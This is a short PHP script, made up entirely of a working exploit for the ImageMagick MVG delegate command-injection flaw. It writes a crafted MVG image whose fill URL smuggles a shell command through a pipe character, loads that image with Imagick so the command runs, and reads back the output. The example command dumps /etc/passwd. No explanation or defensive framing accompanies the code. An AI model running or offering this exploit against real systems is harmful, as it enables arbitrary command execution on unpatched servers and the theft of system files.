<?php
function execcmd($command){

$data_file = tempnam("/tmp", "img");
$imagick_file = tempnam("/tmp", "img");
$exploit = <<<EOF
push graphic-context
viewbox 0 0 640 480
fill "url(https://127.0.0.1/image.jpg"|$command>$data_file")"
pop graphic-context
EOF;
file_put_contents("$imagick_file", $exploit);
$thumb = new Imagick();
$thumb->readImage("$imagick_file");
$thumb->writeImage(tempnam("/tmp", "img"));
$thumb->clear();
$thumb->destroy();
$data = file_get_contents($data_file);
@unlink($data_file);
return $data;
}
echo execcmd('cat /etc/passwd');
?>